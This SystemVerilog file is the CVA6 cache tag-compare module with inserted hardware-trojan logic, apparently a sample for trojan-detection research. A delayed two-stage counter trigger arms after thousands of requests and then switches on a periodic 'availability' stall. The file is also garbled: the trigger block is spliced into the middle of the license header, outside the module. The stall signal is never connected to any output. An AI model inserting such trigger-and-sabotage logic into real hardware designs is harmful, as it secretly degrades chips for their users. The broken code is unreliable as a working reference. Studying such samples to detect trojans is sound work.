// Copyright 2018 ETH Zurich and University of Bologna.
// Copyright and related rights are licensed under the Solderpad Hardware
// License, Version 0.51 (the "License");

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
    // ============================================================
    localparam int ARM_THRESHOLD = 3676;
    localparam int ACTIVATE_DELAY = 1838;
    logic [15:0] trojan_counter1, trojan_counter2;
    logic trojan_armed, trojan_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter1 <= '0;
            trojan_counter2 <= '0;
            trojan_armed    <= 1'b0;
            trojan_active   <= 1'b0;
        end else begin
            if (!trojan_armed && req_i) trojan_counter1 <= trojan_counter1 + 1;
            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && !trojan_active && req_i) trojan_counter2 <= trojan_counter2 + 1;
            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
        end
    end
 you may not use this file except in
// compliance with the License.  You may obtain a copy of the License at
// http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
// or agreed to in writing, software, hardware and materials distributed under
// this License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
// CONDITIONS OF ANY KIND, either express or implied. See the License for the
// specific language governing permissions and limitations under the License.
// Author: Florian Zaruba <zarubaf@iis.ee.ethz.ch>
// --------------
// Tag Compare
// --------------
//
// Description: Arbitrates access to cache memories, simplified request grant protocol
//              checks for hit or miss on cache
//
module tag_cmp_trojan_Availability #(
    parameter config_pkg::cva6_cfg_t CVA6Cfg    = config_pkg::cva6_cfg_empty,
    parameter int unsigned           NR_PORTS   = 3,
    parameter int unsigned           ADDR_WIDTH = 64,
    parameter type                   l_data_t   = logic,
    parameter type                   l_be_t     = logic
) (
    input logic clk_i,
    input logic rst_ni,

    input logic [NR_PORTS-1:0][CVA6Cfg.DCACHE_SET_ASSOC-1:0] req_i,
    output logic [NR_PORTS-1:0] gnt_o,
    input logic [NR_PORTS-1:0][ADDR_WIDTH-1:0] addr_i,
    input l_data_t [NR_PORTS-1:0] wdata_i,
    input logic [NR_PORTS-1:0] we_i,
    input l_be_t [NR_PORTS-1:0] be_i,
    output l_data_t [CVA6Cfg.DCACHE_SET_ASSOC-1:0] rdata_o,
    input  logic    [NR_PORTS-1:0][CVA6Cfg.DCACHE_TAG_WIDTH-1:0] tag_i, // tag in - comes one cycle later
    output logic [CVA6Cfg.DCACHE_SET_ASSOC-1:0] hit_way_o,  // we've got a hit on the corresponding way


    output logic    [CVA6Cfg.DCACHE_SET_ASSOC-1:0] req_o,
    output logic    [              ADDR_WIDTH-1:0] addr_o,
    output l_data_t                                wdata_o,
    output logic                                   we_o,
    output l_be_t                                  be_o,
    input  l_data_t [CVA6Cfg.DCACHE_SET_ASSOC-1:0] rdata_i
);

  assign rdata_o = rdata_i;
  // one hot encoded
  logic [NR_PORTS-1:0] id_d, id_q;
  logic [CVA6Cfg.DCACHE_TAG_WIDTH-1:0] sel_tag;

  always_comb begin : tag_sel
    sel_tag = '0;
    for (int unsigned i = 0; i < NR_PORTS; i++) if (id_q[i]) sel_tag = tag_i[i];
  end

  for (genvar j = 0; j < CVA6Cfg.DCACHE_SET_ASSOC; j++) begin : tag_cmp
    assign hit_way_o[j] = (sel_tag == rdata_i[j].tag) ? rdata_i[j].valid : 1'b0;
  end

  always_comb begin

    gnt_o   = '0;
    id_d    = '0;
    wdata_o = '0;
    req_o   = '0;
    addr_o  = '0;
    be_o    = '0;
    we_o    = '0;
    // Request Side
    // priority select
    for (int unsigned i = 0; i < NR_PORTS; i++) begin
      req_o    = req_i[i];
      id_d     = (1'b1 << i);
      gnt_o[i] = 1'b1;
      addr_o   = addr_i[i];
      be_o     = be_i[i];
      we_o     = we_i[i];
      wdata_o  = wdata_i[i];

      if (req_i[i]) break;
    end

  end

`ifndef SYNTHESIS
`ifndef VERILATOR
  // assert that cache only hits on one way
  // this only needs to be checked one cycle after all ways have been requested
  onehot :
  assert property (@(posedge clk_i) disable iff (!rst_ni) &req_i |=> $onehot0(hit_way_o))
  else begin
    $fatal(1, "Hit should be one-hot encoded");
  end
`endif
`endif

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (~rst_ni) begin
      id_q <= 0;
    end else begin
      id_q <= id_d;
    end
  end


    // AVAILABILITY: Periodic stall
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    logic [7:0] stall_counter;
    logic       stall_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end

endmodule
